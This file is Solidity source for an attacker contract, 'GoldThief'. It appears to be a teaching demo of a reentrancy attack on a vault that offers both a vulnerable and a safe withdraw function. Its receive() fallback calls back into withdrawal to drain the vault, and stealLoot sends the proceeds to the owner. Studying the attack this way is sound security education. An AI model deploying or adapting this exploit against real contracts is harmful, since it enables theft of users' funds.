// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {
    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value > 0, "Need money to attack");

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value:msg.value}();
        targetVault.vulnerableWithdraw();
    }

    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value > 0, "Need money to attack");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value:msg.value}();
        targetVault.safeWithdraw();
    }

    receive() external payable {
        attackCount++;

        if(!attackingSafe && address(targetVault).balance > 0 && attackCount < 5) {
            targetVault.vulnerableWithdraw();
        }

        if(attackingSafe) {
            targetVault.safeWithdraw();
        }
    }

    function stealLoot() external {
        require(msg.sender == owner, "Only owner");

        (bool success,) = owner.call{value:address(this).balance}("");
        require(success, "Transfer failed");
    }

    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }

}